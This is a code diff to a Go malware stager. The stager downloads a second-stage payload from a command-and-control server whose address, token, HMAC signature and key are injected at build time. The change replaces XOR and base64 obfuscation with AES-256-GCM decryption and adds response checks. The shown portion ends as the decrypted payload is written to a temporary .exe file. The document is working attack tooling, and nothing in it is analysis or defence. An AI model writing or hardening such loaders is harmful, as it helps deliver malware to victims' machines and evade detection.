@@ -4,7 +4,8 @@
 package main
 
 import (
-	"encoding/base64"
+	"crypto/aes"
+	"crypto/cipher"
 	"encoding/hex"
 	"io"
 	"net/http"
@@ -13,17 +14,23 @@ import (
 )
 
 var (
-	C2URL  string // injected via ldflags
-	XORKey string // hex-encoded XOR key, injected via ldflags
+	BaseURL string // origin of the C2, injected via ldflags
+	Token   string // hex-encoded stage token, injected via ldflags
+	Sig     string // url-safe base64 HMAC signature, injected via ldflags
+	KeyHex  string // hex-encoded AES-256-GCM stage key, injected via ldflags
 )
 
 func main() {
-	resp, err := http.Get(C2URL + "/stage/" + XORKey)
+	resp, err := http.Get(BaseURL + "/stage/" + Token + "?s=" + Sig)
 	if err != nil {
 		os.Stderr.WriteString("error fetching stage: " + err.Error() + "\n")
 		return
 	}
 	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		os.Stderr.WriteString("stage fetch failed: " + resp.Status + "\n")
+		return
+	}
 
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
@@ -31,20 +38,32 @@ func main() {
 		return
 	}
 
-	data, err := base64.StdEncoding.DecodeString(string(body))
+	key, err := hex.DecodeString(KeyHex)
 	if err != nil {
-		os.Stderr.WriteString("error decoding base64: " + err.Error() + "\n")
+		os.Stderr.WriteString("error decoding stage key: " + err.Error() + "\n")
 		return
 	}
 
-	key, err := hex.DecodeString(XORKey)
+	block, err := aes.NewCipher(key)
 	if err != nil {
-		os.Stderr.WriteString("error decoding XOR key: " + err.Error() + "\n")
+		os.Stderr.WriteString("error initializing cipher: " + err.Error() + "\n")
+		return
+	}
+	aead, err := cipher.NewGCM(block)
+	if err != nil {
+		os.Stderr.WriteString("error initializing AEAD: " + err.Error() + "\n")
+		return
+	}
+	ns := aead.NonceSize()
+	if len(body) < ns {
+		os.Stderr.WriteString("stage payload too short\n")
 		return
 	}
 
-	for i := range data {
-		data[i] ^= key[i%len(key)]
+	data, err := aead.Open(nil, body[:ns], body[ns:], nil)
+	if err != nil {
+		os.Stderr.WriteString("error decrypting stage: " + err.Error() + "\n")
+		return
 	}
 
 	tmpFile, err := os.CreateTemp("", "*.exe")
